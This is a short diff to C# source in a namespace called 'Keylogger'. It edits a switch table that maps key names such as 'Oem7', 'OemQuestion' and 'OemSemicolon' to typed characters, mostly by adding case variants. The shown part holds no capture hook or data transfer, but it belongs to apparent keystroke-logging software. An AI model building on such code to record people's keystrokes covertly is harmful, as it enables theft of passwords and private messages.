@@ -129,7 +129,7 @@ namespace Keylogger
                             msg = " ";
                             break;
 
-                        case "Oem7":
+                        case "oem7":
                             msg="'";
                             break;
                         case "down":
@@ -147,7 +147,7 @@ namespace Keylogger
                         case "back":
                             msg = " B ";
                             break;
-                        case "Oemcomma":
+                        case "oemComma":case "OEMCOMMA":case "oemcomma":
                             msg=",";
                             break;
                         case "Capital":
@@ -156,25 +156,25 @@ namespace Keylogger
                         case "Tab":
                             msg="TAB ";
                             break;
-                        case "OemQuestion":
+                        case "oemQuestion":case "OEMQUESTION":case "oemquestion":
                             msg="?";
                             break;
-                        case "Oem1":
+                        case "oem1":
                             msg=";";
                             break;
-                        case "Oem5":
+                        case "oem5":
                             msg="\\";
                             break;
-                        case "Oem6":
+                        case "oem6":
                             msg="]";
                             break;
-                        case "OemOpenBrackets":
+                        case "oemOpenBrackets":
                             msg="[";
                             break;
-                        case "OemMinus":
+                        case "oemMinus": case "OEMMINUS":case "oemminus":
                             msg="-";
                             break;
-                        case "Oemplus":
+                        case "oemPlus":case "oemplus":case "OEMPLUS":
                             msg="+";
                             break;
                         /*case Keys.Down:
@@ -252,7 +252,7 @@ namespace Keylogger
                             msg = "";
                             break;
 
-                            case "OemSemicolon":
+                            case "OemSemicolon":case "OEMSEMICOLON":case "oemsemicolon":
                             msg=";";
                             break;
                         case "DELETE":case "delete":
